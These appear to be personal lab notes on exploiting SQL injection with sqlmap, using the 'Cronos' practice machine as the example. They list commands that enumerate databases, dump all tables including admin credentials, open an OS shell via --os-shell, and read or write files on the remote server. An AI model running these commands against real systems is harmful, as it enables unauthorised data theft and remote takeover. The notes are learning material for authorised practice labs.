* we can copy the request into a file and then put the file in `sqlmap` as follows if we're suspecting an sql injection  

```console
sqlmap -r [FILE NAME]
```  


* We can also use the switch/option/flag `--os-shell` to get a shell from the sql injection.  


* So I'm taking the machine "Cronos" as my example here because it's the first time I use `sqlmap` in.
* We can enumerate the databases names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data='username=&password=' --method POST --dbs --batch
  ```
* In addition to the databases' names the previous line also provided me with the version of the SQL on the server. 
* `--batch` answers the questions for me with the default. 
<br/>
* We can also get the tables' names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data="username=&password=" --method POST -D [DATABASE NAME] --dump all --batch
  ```
* When using this command I also got the content of the admin table. 
* Sqlmap seems to use the SQLi vulneribility in the application to gain access to:
  * Determine the schema of the database (database, table and column names).
  * Dump data from tables.
  * Potentially upload or download files to the database server machine.
  * Perform out-of-band tests.
  * Dump usernames, password hashes, privileges and roles.
  * Pass hashes off to a password cracker for a dictionary attack.
  * Perform "blind" and "boolean-based" sql injection attacks (if the web application doesn't return any error messages then sqlmap is the most time-saving tool in this case).
  * Potentially even launch a remote shell on the database server.

 `sqlmap --file-write=/path/to/file/on/your/system --file-dest=/path/to/write/the/file/on/remote/system`
 * we can also read files that if we have the privilege to do so `sqlmap --file-read=/path/to/file/to/read`.
